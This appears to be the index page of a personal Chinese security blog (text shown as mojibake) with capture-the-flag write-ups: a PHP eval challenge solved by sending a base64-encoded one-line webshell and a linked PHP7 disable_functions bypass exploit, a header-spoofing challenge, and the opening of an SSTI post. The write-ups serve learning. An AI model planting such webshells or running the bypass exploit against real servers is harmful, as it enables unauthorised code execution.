<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="baidu-site-verification" content="L6Lm9d5Crl"/>
  
  
  
  
  <title>babaç«¥é‹çš„åšå®¢</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="babaç«¥é‹çš„åšå®¢">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="babaç«¥é‹çš„åšå®¢">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Jialu">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="babaç«¥é‹çš„åšå®¢" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/ljl.jpg">
  
  
  
<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
  
    
    
  
  
      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  
  <!-- åŠ è½½ç‰¹æ•ˆ -->
    <script src="/js/pace.js"></script>
    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
  <script>
      var yiliaConfig = {
          fancybox: true,
          animate: true,
          isHome: true,
          isPost: false,
          isArchive: false,
          isTag: false,
          isCategory: false,
          open_in_new: false
      }
  </script>
<meta name="generator" content="Hexo 5.2.0"></head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        
<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>

        <a href="/" class="profilepic">
            
            <img lazy-src="/img/ljl.jpg" class="js-avatar">
            
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/"></a></h1>
        </hgroup>
        
        
            <form>
                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="æœç´¢ä¸€ä¸‹" autocomplete="off">
            </form>
            <div id="local-search-result"></div>
        
        
            <script type="text/javascript">
                (function() {
                    'use strict';
                    function getMatchData(keyword, data) {
                        var matchData = [];
                        for(var i =0;i<data.length;i++){
                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
                                matchData.push(data[i])
                        }
                        return matchData;
                    }
                    var $input = $('#local-search-input');
                    var $resultContent = $('#local-search-result');
                    $input.keyup(function(){
                        $.ajax({
                            url: '/search.json',
                            dataType: "json",
                            success: function( json ) {
                                var str='<ul class=\"search-result-list\">';                
                                var keyword = $input.val().trim().toLowerCase();
                                $resultContent.innerHTML = "";
                                if ($input.val().trim().length <= 0) {
                                    $resultContent.empty();
                                    $('#switch-area').show();
                                    return;
                                }
                                var results = getMatchData(keyword, json);
                                if(results.length === 0){
                                    $resultContent.empty();
                                    $('#switch-area').show();
                                    return;
                                } 
                                for(var i =0; i<results.length; i++){
                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
                                }
                                str += "</ul>";
                                $resultContent.empty();
                                $resultContent.append(str);
                                $('#switch-area').hide();
                            }
                        });
                    });
                })();
            </script>
        
        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>èœå•</li>
                        <li>æ ‡ç­¾</li>
                        
                        <li>å‹æƒ…é“¾æ¥</li>
                        
                        
                        <li>å…³äºæˆ‘</li>
                        
                    </ul>
                </div>
            </div>
        
        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a  href="/archives/">æ‰€æœ‰æ–‡ç« </a></li>
                        
                            <li><a  href="/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/">ç©è½¬å¼€å‘å·¥å…·</a></li>
                        
                            <li><a  href="/categories/digital">ç©è½¬æ•°ç </a></li>
                        
                            <li><a  href="/categories/algorithm">ç®—æ³•å­¦ä¹ </a></li>
                        
                            <li><a  href="/about/">å…³äºæˆ‘</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fl github"  target="_blank" href="/xxxxx" title="github">github</a>
                            
                                <a class="fl weibo"  target="_blank" href="/xxxxxxxx" title="weibo">weibo</a>
                            
                                <a class="fl rss"  target="_blank" href="/atom.xml" title="rss">rss</a>
                            
                        </ul>
                    </nav>
                </section>
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        
                    </div>
                </section>
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://blog.csdn.net/baidu_21483933">csdn</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://segmentfault.com/blog/maocg_web">segmentfault</a>
                    
                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.jianshu.com/users/eb37ef89c746/latest_articles">ç®€ä¹¦</a>
                    
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">çˆ±åŠ¨æ¼«,çˆ±æ¸¸æˆ,çˆ±ç¼–ç¨‹,çˆ±è¿åŠ¨,çˆ±çš„å¤ªå¤šäº†!</div>
                </section>
                
            </div>
        </div>
    </header>
</div>

    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="å›åˆ°ä¸»é¡µ"></a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                
                    <img lazy-src="/img/ljl.jpg" class="js-avatar">
                
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="å›åˆ°ä¸»é¡µ"></a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/archives/">æ‰€æœ‰æ–‡ç« </a></li>
                
                    <li><a href="/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/">ç©è½¬å¼€å‘å·¥å…·</a></li>
                
                    <li><a href="/categories/digital">ç©è½¬æ•°ç </a></li>
                
                    <li><a href="/categories/algorithm">ç®—æ³•å­¦ä¹ </a></li>
                
                    <li><a href="/about/">å…³äºæˆ‘</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                <div class="social">
                    
                        <a class="github" target="_blank" href="/xxxxx" title="github">github</a>
                    
                        <a class="weibo" target="_blank" href="/xxxxxxxx" title="weibo">weibo</a>
                    
                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
                    
                </div>
            </nav>
        </header>
    </div>
</nav>
      <div class="body-wrap">
  
    <article id="post-ci" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/04/08/ci/" class="article-date">
      <time datetime="2021-04-08T08:44:56.000Z" itemprop="datePublished">2021-04-08</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/04/08/ci/">buuç»ƒä¹ [GKCTF2020]CheckIN</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>æ‰“å¼€é¢˜ç›®ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="prism language-php"><span class="token operator">&lt;</span>title<span class="token operator">&gt;</span>Check_In<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">&gt;</span>
<span class="token delimiter important">&lt;?php</span> 
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">ClassName</span>
<span class="token punctuation">&#123;<!-- --></span>
        <span class="token keyword">public</span> <span class="token variable">$code</span> <span class="token operator">&#61;</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token variable">$decode</span> <span class="token operator">&#61;</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;<!-- --></span>
                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">code</span> <span class="token operator">&#61;</span> &#64;<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token single-quoted-string string">&#39;Ginkgo&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//å¯ä»¥ä¼ å‚</span>
                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">decode</span> <span class="token operator">&#61;</span> &#64;<span class="token function">base64_decode</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">code</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//basae64è§£å¯†ä¸€ä¸‹ä¼ å…¥å†…å®¹</span>
                &#64;<span class="token function">Eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">decode</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">x</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;<!-- --></span>
                <span class="token keyword">return</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">new</span> <span class="token class-name">ClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>çœ‹èµ·æ¥åƒæ˜¯é­”æ³•å‡½æ•°ï¼Œä¸è¿‡è¿™é“é¢˜æ²¡æœ‰åºåˆ—åŒ–å‡½æ•°ï¼Œå¯ä»¥é€šè¿‡ä¼ å‚æ¥ç›´æ¥ä½œç­”:<br>é¦–å…ˆä¼ å…¥<code>phpinfo();</code><br>ç”±äºè¿™é“é¢˜æ˜¯base64è§£å¯†ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä¼ å…¥ä»–çš„base64å€¼:<code>cGhwaW5mbygpOw==</code><br>æœ€ç»ˆpayloadï¼š</p>
<pre><code>?Ginkgo=cGhwaW5mbygpOw==</code></pre>

<p><img src="/2021/04/08/ci/1.png"><br>å‘ç°è¿‡æ»¤äº†è®¸å¤šå±é™©å‡½æ•°<br>ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼š<code>eval(@$_POST['shell']);</code>,base64ä¹‹åæ˜¯ï¼š<code>ZXZhbChAJF9QT1NUWydzaGVsbCddKTs=</code><br>æœ€ç»ˆpayloadï¼š</p>
<pre><code>?Ginkgo=ZXZhbChAJF9QT1NUWydzaGVsbCddKTs=/code></code></pre>

<p>æœ€åè¿ä¸Šèœåˆ€<br><img src="/2021/04/08/ci/2.png"><br>é€šè¿‡readflagæ¥è¯»å–flag<br>ä½†å®Œå…¨æ²¡æ€è·¯çœ‹å¤§ä½¬wpè¦æ³¨æ„ç‰ˆæœ¬ï¼Œéœ€è¦ç»•è¿‡çš„expï¼Œä¸Šä¼ è‡³æœåŠ¡å™¨ç›®å½•ï¼Œå¹¶æ‰§è¡Œ<br>ä¸‹è½½åœ°å€ï¼š<a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a><br>æ–‡ä»¶é‡Œé¢pwnå‡½æ•°åé¢ï¼ˆï¼‰ä¸­æ˜¯è¦æ”¾æ‰§è¡Œçš„å‘½ä»¤ï¼Œ pwnåé¢æ”¹æˆï¼š<code>pwn("/readflag");</code>ï¼Œä¸Šä¼ è‡³æœåŠ¡å™¨<br><img src="/2021/04/08/ci/3.png"><br>è¿™é‡Œæˆ‘ä»¬æ— æ³•ç›´æ¥æ¥è¯»å–expï¼Œéœ€è¦ä¼ å…¥POSTå‚æ•°ï¼šc=include(â€˜/tmp/exploit.phpâ€™)<br>å¾—åˆ°flag<br><img src="/2021/04/08/ci/4.png"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-pig" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/04/07/pig/" class="article-date">
      <time datetime="2021-04-07T10:41:54.000Z" itemprop="datePublished">2021-04-07</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/04/07/pig/">ç»ƒä¹ -[BJDCTF 2nd]å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€ 73</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>è¿™æ˜¯ä¸€é“éå¸¸ç®€å•åˆå¾ˆç‹—çš„æŠ“åŒ…é¢˜<br>æ‰“å¼€é¢˜ç›®ï¼š<br><img src="/2021/04/07/pig/1.png"><br>adminç™»å½•ï¼šè¯´æˆ‘æ‰ä¸æ˜¯admin<br>é‚£ä¹ˆéšä¾¿è¾“å…¥è´¦å·å¯†ç ï¼ŒæˆåŠŸç™»å½•ï¼š<br><img src="/2021/04/07/pig/2.png"><br>æŸ¥çœ‹æºç å¹¶æ²¡æœ‰ä»€ä¹ˆæç¤º<br>é‡æ–°ç™»é™†ä¸‹bpæŠ“åŒ…ï¼š<br><img src="/2021/04/07/pig/3.png"><br>å‘ç°æœ‰ä¸ªL0g1n.phpæ–‡ä»¶ï¼Œå¯¹å…¶è¿›è¡Œè®¿é—®:<br><img src="/2021/04/07/pig/4.png"><br>æ€»å…±è¦99å¹´ï¼Ÿå†æŠ“åŒ…è¯•è¯•ï¼Œemmï¼Œè¦æƒ³æŠ“åˆ°è¿˜å¿…é¡»ç™»é™†åå†è®¿é—®ï¼Œæ›´ç‹—çš„æ˜¯ä½ å°±ç®—æ²¡æœ‰é‡æ–°ç™»å½•ä¹Ÿèƒ½æŠ“åˆ°ä¸ªL0g1n.phpï¼Œå®³å¾—æˆ‘æåŠå¤©æ²¡æå‡ºä¸ªç»“æœï¼Œå°±å¾ˆå‰å®³ï¼ˆgouï¼‰ï¼š<br>æˆåŠŸæŠ“åŒ…å<br><img src="/2021/04/07/pig/5.png"><br>æœ‰ä¸ªtimeå€¼ï¼Œå°†å®ƒæ”¹æˆ99ï¼Œ(âŠ™ï¹âŠ™)æ²¡ä»»ä½•å˜åŒ–ï¼Œé‚£æ”¹å¤§ç‚¹<br><img src="/2021/04/07/pig/6.png"></p>
<pre><code> Sorry, this site is only optimized for those who comes from localhost</code></pre>

<p>é‚£ä¹ˆå…ˆxffï¼š<code>X-Forwarded-For: 127.0.0.1</code><br>å‘ç°ä¸å¯ä»¥ï¼Œå«–ä¸‹å¤§ä½¬çš„wpï¼Œè¦ç”¨åˆ°Client-ipæ¥ç™»å½•ï¼š<code>Client-ip: 127.0.0.1</code>(åˆæ˜¯ä¸€ä¸ªä¼ªé€ IPåœ°å€çš„æ–¹æ³•)<br><img src="/2021/04/07/pig/7.png"></p>
<pre><code> Sorry, this site is only optimized for those who come from gem-love.com</code></pre>
<p>åŠ ä¸‹æ¥<code>Referer: gem-love.com</code>:<br><img src="/2021/04/07/pig/8.png"></p>
<pre><code>  Sorry, this site is only optimized for browsers that run on Commodo 64</code></pre>
<p>æµè§ˆå™¨å¿…é¡»æ¥è‡ªCommodo 64ï¼Œä¿®æ”¹User-Agentï¼šCommodo 64<br>emmmmmä»–è¯´nononoä¸æ˜¯çœŸæ­£ä¸ªè°·æ­Œæµè§ˆå™¨ï¼ŒåŠå¤©æ‰çŸ¥é“ä»–çš„å…¨ç§°æ˜¯Commodore 64ï¼Œæˆ‘ç›´æ¥å¥½å®¶ä¼™<br><code>User-Agentï¼šCommodore 64</code><br><img src="/2021/04/07/pig/9.png"></p>
<pre><code>  Sorry, this site is only optimized for those whose email is root@gem-love.com</code></pre>
<p>è¯´é‚®ç®±ä¸å¯¹ï¼Œä¿®æ”¹fromï¼š<code>From: <a href="mailto:&#x72;&#111;&#111;&#x74;&#64;&#103;&#101;&#x6d;&#x2d;&#108;&#111;&#x76;&#x65;&#46;&#99;&#x6f;&#109;">&#x72;&#111;&#111;&#x74;&#64;&#103;&#101;&#x6d;&#x2d;&#108;&#111;&#x76;&#x65;&#46;&#99;&#x6f;&#109;</a></code><br><img src="/2021/04/07/pig/10.png"></p>
<pre><code> Sorry, this site is only optimized for those who use the http proxy of y1ng.vip<br> if you dont have the proxy, pls contact us to buy, ï¿¥100/Month</code></pre>
<p>æç¤ºy1ng.vipä»£ç†æ‰å¯ä»¥<br><code>Via: y1ng.vip</code>:<br><img src="/2021/04/07/pig/11.png"><br>å‘ç°base64ç¼–ç ï¼Œè§£ç åå¾—åˆ°flag<br><img src="/2021/04/07/pig/12.png"><br>å•Šç»ˆäºå‡ºæ¥äº†</p>
<h4>çŸ¥è¯†ç‚¹</h4>


<p>ä¸‹é¢æ˜¯å¤§ä½¬æ€»ç»“çš„Header:è¯·æ±‚å¤´å‚æ•°è¯¦è§£ å¿«æ¥ç™½å«–o(<em>ï¿£â–½ï¿£</em>)ãƒ–</p>
<table>
<thead>
<tr><th style="color:black">Header</th><th style="color:black">>è§£é‡Š</th><th style="color:black">>ç¤ºä¾‹</th></tr>
</thead>
<tbody>
<tr>
<td>Accept</td>
<td>æŒ‡å®šå®¢æˆ·ç«¯èƒ½å¤Ÿæ¥æ”¶çš„å†…å®¹ç±»å‹</td>
<td>Accept: text/plain, text/html,application/json</td>
</tr>
<tr>
<td>Accept-Charset</td>
<td>æµè§ˆå™¨å¯ä»¥æ¥å—çš„å­—ç¬¦ç¼–ç é›†ã€‚</td>
<td>Accept-Charset: iso-8859-5</td>
</tr>
<tr>
<td>Accept-Encoding</td>
<td>æŒ‡å®šæµè§ˆå™¨å¯ä»¥æ”¯æŒçš„webæœåŠ¡å™¨è¿”å›å†…å®¹å‹ç¼©ç¼–ç ç±»å‹ã€‚</td>
<td>Accept-Encoding: compress, gzip</td>
</tr>
<tr>
<td>Accept-Language</td>
<td>æµè§ˆå™¨å¯æ¥å—çš„è¯­è¨€</td>
<td>Accept-Language: en,zh</td>
</tr>
<tr>
<td>Accept-Ranges</td>
<td>å¯ä»¥è¯·æ±‚ç½‘é¡µå®ä½“çš„ä¸€ä¸ªæˆ–è€…å¤šä¸ªå­èŒƒå›´å­—æ®µ</td>
<td>Accept-Ranges: bytes</td>
</tr>
<tr>
<td>Authorization</td>
<td>HTTPæˆæƒçš„æˆæƒè¯ä¹¦</td>
<td>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td>
</tr>
<tr>
<td>Cache-Control</td>
<td>æŒ‡å®šè¯·æ±‚å’Œå“åº”éµå¾ªçš„ç¼“å­˜æœºåˆ¶</td>
<td>Cache-Control: no-cache</td>
</tr>
<tr>
<td>Connection</td>
<td>è¡¨ç¤ºæ˜¯å¦éœ€è¦æŒä¹…è¿æ¥ã€‚ï¼ˆHTTP 1.1é»˜è®¤è¿›è¡ŒæŒä¹…è¿æ¥ï¼‰</td>
<td>Connection: close</td>
</tr>
<tr>
<td>Cookie</td>
<td>HTTPè¯·æ±‚å‘é€æ—¶ï¼Œä¼šæŠŠä¿å­˜åœ¨è¯¥è¯·æ±‚åŸŸåä¸‹çš„æ‰€æœ‰cookieå€¼ä¸€èµ·å‘é€ç»™webæœåŠ¡å™¨ã€‚</td>
<td>Cookie: $Version=1; Skin=new;</td>
</tr>
<tr>
<td>Content-Length</td>
<td>è¯·æ±‚çš„å†…å®¹é•¿åº¦</td>
<td>Content-Length: 348</td>
</tr>
<tr>
<td>Content-Type</td>
<td>è¯·æ±‚çš„ä¸å®ä½“å¯¹åº”çš„MIMEä¿¡æ¯</td>
<td>Content-Type: application/x-www-form-urlencoded</td>
</tr>
<tr>
<td>Date</td>
<td>è¯·æ±‚å‘é€çš„æ—¥æœŸå’Œæ—¶é—´</td>
<td>Date: Tue, 15 Nov 2010 08:12:31 GMT</td>
</tr>
<tr>
<td>Expect</td>
<td>è¯·æ±‚çš„ç‰¹å®šçš„æœåŠ¡å™¨è¡Œä¸º</td>
<td>Expect: 100-continue</td>
</tr>
<tr>
<td>From</td>
<td>å‘å‡ºè¯·æ±‚çš„ç”¨æˆ·çš„Email</td>
<td>From: user@email.com</td>
</tr>
<tr>
<td>Host</td>
<td>æŒ‡å®šè¯·æ±‚çš„æœåŠ¡å™¨çš„åŸŸåå’Œç«¯å£å·</td>
<td>Host: www.zcmhi.com</td>
</tr>
<tr>
<td>If-Match</td>
<td>åªæœ‰è¯·æ±‚å†…å®¹ä¸å®ä½“ç›¸åŒ¹é…æ‰æœ‰æ•ˆ</td>
<td>If-Match: â€œ737060cd8c284d8af7ad3082f209582dâ€</td>
</tr>
<tr>
<td>If-Modified-Since</td>
<td>å¦‚æœè¯·æ±‚çš„éƒ¨åˆ†åœ¨æŒ‡å®šæ—¶é—´ä¹‹åè¢«ä¿®æ”¹åˆ™è¯·æ±‚æˆåŠŸï¼Œæœªè¢«ä¿®æ”¹åˆ™è¿”å›304ä»£ç </td>
<td>If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td>
</tr>
<tr>
<td>If-None-Match</td>
<td>å¦‚æœå†…å®¹æœªæ”¹å˜è¿”å›304ä»£ç ï¼Œå‚æ•°ä¸ºæœåŠ¡å™¨å…ˆå‰å‘é€çš„Etagï¼Œä¸æœåŠ¡å™¨å›åº”çš„Etagæ¯”è¾ƒåˆ¤æ–­æ˜¯å¦æ”¹å˜</td>
<td>If-None-Match: â€œ737060cd8c284d8af7ad3082f209582dâ€</td>
</tr>
<tr>
<td>If-Range</td>
<td>å¦‚æœå®ä½“æœªæ”¹å˜ï¼ŒæœåŠ¡å™¨å‘é€å®¢æˆ·ç«¯ä¸¢å¤±çš„éƒ¨åˆ†ï¼Œå¦åˆ™å‘é€æ•´ä¸ªå®ä½“ã€‚å‚æ•°ä¹Ÿä¸ºEtag</td>
<td>If-Range: â€œ737060cd8c284d8af7ad3082f209582dâ€</td>
</tr>
<tr>
<td>If-Unmodified-Since</td>
<td>åªåœ¨å®ä½“åœ¨æŒ‡å®šæ—¶é—´ä¹‹åæœªè¢«ä¿®æ”¹æ‰è¯·æ±‚æˆåŠŸ</td>
<td>If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td>
</tr>
<tr>
<td>Max-Forwards</td>
<td>é™åˆ¶ä¿¡æ¯é€šè¿‡ä»£ç†å’Œç½‘å…³ä¼ é€çš„æ—¶é—´</td>
<td>Max-Forwards: 10</td>
</tr>
<tr>
<td>Pragma</td>
<td>ç”¨æ¥åŒ…å«å®ç°ç‰¹å®šçš„æŒ‡ä»¤</td>
<td>Pragma: no-cache</td>
</tr>
<tr>
<td>Proxy-Authorization</td>
<td>è¿æ¥åˆ°ä»£ç†çš„æˆæƒè¯ä¹¦</td>
<td>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td>
</tr>
<tr>
<td>Range</td>
<td>åªè¯·æ±‚å®ä½“çš„ä¸€éƒ¨åˆ†ï¼ŒæŒ‡å®šèŒƒå›´</td>
<td>Range: bytes=500-999</td>
</tr>
<tr>
<td>Referer</td>
<td>å…ˆå‰ç½‘é¡µçš„åœ°å€ï¼Œå½“å‰è¯·æ±‚ç½‘é¡µç´§éšå…¶å,å³æ¥è·¯</td>
<td>Referer:&nbsp;<a href="http://www.zcmhi.com/archives/71.html" target="_blank">http://www.zcmhi.com/archives...</a></td>
</tr>
<tr>
<td>TE</td>
<td>å®¢æˆ·ç«¯æ„¿æ„æ¥å—çš„ä¼ è¾“ç¼–ç ï¼Œå¹¶é€šçŸ¥æœåŠ¡å™¨æ¥å—æ¥å—å°¾åŠ å¤´ä¿¡æ¯</td>
<td>TE: trailers,deflate;q=0.5</td>
</tr>
<tr>
<td>Upgrade</td>
<td>å‘æœåŠ¡å™¨æŒ‡å®šæŸç§ä¼ è¾“åè®®ä»¥ä¾¿æœåŠ¡å™¨è¿›è¡Œè½¬æ¢ï¼ˆå¦‚æœæ”¯æŒï¼‰</td>
<td>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</td>
</tr>
<tr>
<td>User-Agent</td>
<td>User-Agentçš„å†…å®¹åŒ…å«å‘å‡ºè¯·æ±‚çš„ç”¨æˆ·ä¿¡æ¯</td>
<td>User-Agent: Mozilla/5.0 (Linux; X11)</td>
</tr>
<tr>
<td>Via</td>
<td>é€šçŸ¥ä¸­é—´ç½‘å…³æˆ–ä»£ç†æœåŠ¡å™¨åœ°å€ï¼Œé€šä¿¡åè®®</td>
<td>Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)</td>
</tr>
<tr>
<td>Warning</td>
<td>å…³äºæ¶ˆæ¯å®ä½“çš„è­¦å‘Šä¿¡æ¯</td>
<td>Warn: 199 Miscellaneous warning</td>
</tr>
</tbody>
</table>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-ssti" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/04/06/ssti/" class="article-date">
      <time datetime="2021-04-06T07:53:13.000Z" itemprop="datePublished">2021-04-06</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/04/06/ssti/">SSTIæ³¨å…¥&amp;&amp;[BJDCTF2020]The mystery of ip 1</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="0x00-çŸ¥è¯†ç‚¹">#çŸ¥è¯†ç‚¹</h2>
<p><strong>SSTIæ¨¡æ¿æ³¨å…¥ï¼š</strong><br>

</p><p><img src="/2021/04/06/ssti/1.png"></p>
<p>æ¨¡æ¿æ³¨å…¥æ¶‰åŠçš„æ˜¯æœåŠ¡ç«¯Webåº”ç”¨ä½¿ç”¨æ¨¡æ¿å¼•æ“æ¸²æŸ“ç”¨æˆ·è¯·æ±‚çš„è¿‡ç¨‹</p>
<p>æœåŠ¡ç«¯æŠŠç”¨æˆ·è¾“å…¥çš„å†…å®¹æ¸²æŸ“æˆæ¨¡æ¿å°±å¯èƒ½é€ æˆSSTI(Server-Side Template Injection)</p>
<h2 id="#æ¨¡æ¿å¼•æ“">01æ¨¡æ¿å¼•æ“</h2>
<p>æ¨¡æ¿å¼•æ“ï¼ˆè¿™é‡Œç‰¹æŒ‡ç”¨äºWebå¼€å‘çš„æ¨¡æ¿å¼•æ“ï¼‰æ˜¯ä¸ºäº†ä½¿ç”¨æˆ·ç•Œé¢ä¸ä¸šåŠ¡æ•°æ®ï¼ˆå†…å®¹ï¼‰åˆ†ç¦»è€Œäº§ç”Ÿçš„ï¼Œå®ƒå¯ä»¥ç”Ÿæˆç‰¹å®šæ ¼å¼çš„æ–‡æ¡£ï¼Œç”¨äºç½‘ç«™çš„æ¨¡æ¿å¼•æ“å°±ä¼šç”Ÿæˆä¸€ä¸ªæ ‡å‡†çš„HTMLæ–‡æ¡£ã€‚ä¸€äº›æ¨¡æ¿å¼•æ“ï¼šSmartyï¼ŒMakoï¼ŒJinja2ï¼ŒJadeï¼ŒVelocityï¼ŒFreemakerå’ŒTwig</p>
<pre><code>
